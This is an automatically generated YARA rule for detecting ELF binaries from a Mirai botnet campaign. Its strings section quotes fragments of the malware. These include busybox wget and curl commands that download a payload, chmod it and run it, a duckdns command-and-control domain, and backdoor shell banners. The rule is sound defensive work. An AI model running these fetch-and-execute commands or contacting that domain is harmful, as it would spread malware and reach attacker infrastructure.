rule Sightlines_c2_7cd53316_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-7cd53316"
        date = "2026-11-16"
        campaign = "c2-7cd53316"
        family = "mirai"
        hash = "10b691863ca9d7afe108ed871eea6559ba34c77e691461855a7c3671158a4b89"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-7cd53316.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "usybox wget http://%s/mips; chmod 777 mips; ./mips selfrep.realtek" ascii
        $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/b" ascii
        $s2 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 t" ascii
        $s3 = "/proc/%d/task/%d/children" ascii
        $s4 = "imissyou333.duckdns.org" ascii
        $s5 = "Connection: keep-alive" ascii
        $s6 = "[0mNo shell available" ascii
        $s7 = "elnet.sh; sh telnet.sh; " ascii
        $s8 = "[0mAccess granted!" ascii
        $s9 = "[0mWrong password!" ascii
        $s10 = "/usr/bin/watchdogd" ascii
        $s11 = "/usr/sbin/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}
